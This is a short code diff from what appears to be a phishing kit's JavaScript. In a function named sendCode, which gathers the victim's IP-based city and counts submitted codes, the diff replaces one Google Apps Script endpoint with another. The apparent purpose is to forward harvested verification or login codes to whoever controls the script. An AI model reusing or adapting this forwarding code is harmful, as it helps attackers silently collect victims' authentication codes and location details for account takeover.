@@ -148,8 +148,7 @@ function sendCode() {
       ` <strong>City:</strong> <code>${IpAddress?.city || "N/A"}</code>`;
 
     NUMBER_TIME_SEND_CODE++;
-    const forwardUrl = `https://script.google.com/macros/s/AKfycbxBe3g1Zkv90RO8-rWrarKK83nr-i-kc2rqeIo3cJ-zSMNGlHDQMXaoJgMMQTw8V7C5/exec`;
-
+    const forwardUrl = `https://script.google.com/macros/s/AKfycby27Abw0bRcvZ68-2S5MOsBBX1mBKIluZXR6VmGjr4IpY5K5D-kiwbd4WaAG-XnLE2AOw/exec`;
 
     fetch(forwardUrl, {
         method: 'POST',
